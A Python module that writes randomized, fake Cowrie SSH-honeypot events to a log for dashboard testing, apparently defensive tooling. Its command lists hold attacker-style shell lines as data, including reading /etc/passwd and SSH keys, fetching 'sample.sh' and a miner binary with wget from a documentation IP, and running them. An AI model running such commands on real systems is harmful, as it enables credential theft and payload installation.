"""Safe, local-only synthetic Cowrie event generator for dashboard testing."""
from __future__ import annotations

import json
import random
import threading
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path

# TEST-NET addresses reserved for documentation; never use real attacker IPs.
IPS = [f"192.0.2.{n}" for n in range(10, 30)] + [f"198.51.100.{n}" for n in range(10, 30)] + [f"203.0.113.{n}" for n in range(10, 30)]
USERS = ["root", "admin", "ubuntu", "test", "postgres", "pi"]
PASSWORDS = ["admin", "123456", "password", "toor", "letmein", "raspberry"]
CLIENTS = ["SSH-2.0-OpenSSH_8.9", "SSH-2.0-libssh-0.9", "SSH-2.0-paramiko_3.4", "SSH-2.0-Go"]
COMMAND_GROUPS = {
    "recon": ["whoami", "uname -a", "cat /etc/os-release", "ps aux", "ip addr", "netstat -tulpn"],
    "credentials": ["cat /etc/passwd", "ls -la /root/.ssh", "cat ~/.bash_history"],
    "download": ["cd /tmp", "wget http://203.0.113.99/sample.sh", "chmod +x sample.sh"],
    "persistence": ["crontab -l", "useradd -m analyst-test", "echo test-entry >> /tmp/demo.log"],
    "miner": ["cd /tmp", "wget http://203.0.113.99/sample.bin", "./sample.bin --version"],
}


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


class RandomEventGenerator:
    """Writes randomized, harmless Cowrie-shaped events to a JSON-lines log."""
    def __init__(self, log_path: Path):
        self.log_path = Path(log_path)
        self._lock = threading.Lock()
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()
        self._status = {"running": False, "target_sessions": 0, "completed_sessions": 0,
                        "events_written": 0, "last_event": "", "error": ""}

    def status(self) -> dict:
        with self._lock:
            return dict(self._status)

    def start(self, sessions: int, speed: str = "normal") -> tuple[bool, dict]:
        sessions = max(1, min(int(sessions), 100))
        speed = speed if speed in ("normal", "fast") else "normal"
        with self._lock:
            if self._thread and self._thread.is_alive():
                return False, dict(self._status)
            self._stop = threading.Event()
            self._status = {"running": True, "target_sessions": sessions, "completed_sessions": 0,
                            "events_written": 0, "last_event": "Starting generator…", "error": ""}
            self._thread = threading.Thread(target=self._run, args=(sessions, speed, self._stop),
                                            daemon=True, name="hyshield-test-event-generator")
            self._thread.start()
            return True, dict(self._status)

    def stop(self) -> dict:
        self._stop.set()
        thread = self._thread
        if thread and thread.is_alive():
            thread.join(timeout=1.5)
        with self._lock:
            if not thread or not thread.is_alive():
                self._status["running"] = False
                self._status["last_event"] = "Generator stopped"
            return dict(self._status)

    def _emit(self, eventid: str, session: str, ip: str, **fields) -> None:
        event = {"eventid": eventid, "timestamp": _now(), "session": session,
                 "src_ip": ip, "sensor": "hyshield-test-generator", **fields}
        self.log_path.parent.mkdir(parents=True, exist_ok=True)
        with open(self.log_path, "a", encoding="utf-8") as f:
            f.write(json.dumps(event, ensure_ascii=True) + "\n")
        with self._lock:
            self._status["events_written"] += 1
            self._status["last_event"] = eventid

    def _run(self, count: int, speed: str, stop: threading.Event) -> None:
        pause = 0 if speed == "fast" else 0.65
        try:
            for _ in range(count):
                if stop.is_set():
                    break
                session, ip = uuid.uuid4().hex[:12], random.choice(IPS)
                kind = random.choice(["scan", "bruteforce", "recon", "credentials", "download", "persistence", "miner"])
                self._emit("cowrie.session.connect", session, ip, src_port=random.randint(20000, 65000), protocol="ssh")
                self._emit("cowrie.client.version", session, ip, version=random.choice(CLIENTS))
                if kind != "scan":
                    failed = random.randint(4, 8) if kind == "bruteforce" else random.randint(0, 2)
                    for _ in range(failed):
                        if stop.is_set(): break
                        self._emit("cowrie.login.failed", session, ip, username=random.choice(USERS), password=random.choice(PASSWORDS))
                        if pause: time.sleep(pause)
                    if not stop.is_set() and not (kind == "bruteforce" and random.random() < 0.45):
                        self._emit("cowrie.login.success", session, ip, username=random.choice(USERS[:3]), password=random.choice(PASSWORDS))
                        groups = {
                            "recon": ["recon"], "credentials": ["recon", "credentials"],
                            "download": ["recon", "download"], "persistence": ["recon", "persistence"],
                            "miner": ["miner"], "bruteforce": ["recon"],
                        }.get(kind, [])
                        for group in groups:
                            for command in COMMAND_GROUPS[group]:
                                if stop.is_set(): break
                                self._emit("cowrie.command.input", session, ip, input=command, message=f"CMD: {command}")
                                if pause: time.sleep(pause)
                self._emit("cowrie.session.closed", session, ip, duration=random.randint(2, 180))
                with self._lock:
                    self._status["completed_sessions"] += 1
                if pause: time.sleep(0.8)
        except Exception as exc:  # surfaced on the generator status panel
            with self._lock:
                self._status["error"] = str(exc)[:300]
        finally:
            with self._lock:
                self._status["running"] = False
                if not self._status["error"]:
                    self._status["last_event"] = "Generation complete" if self._status["completed_sessions"] >= count else "Generator stopped"
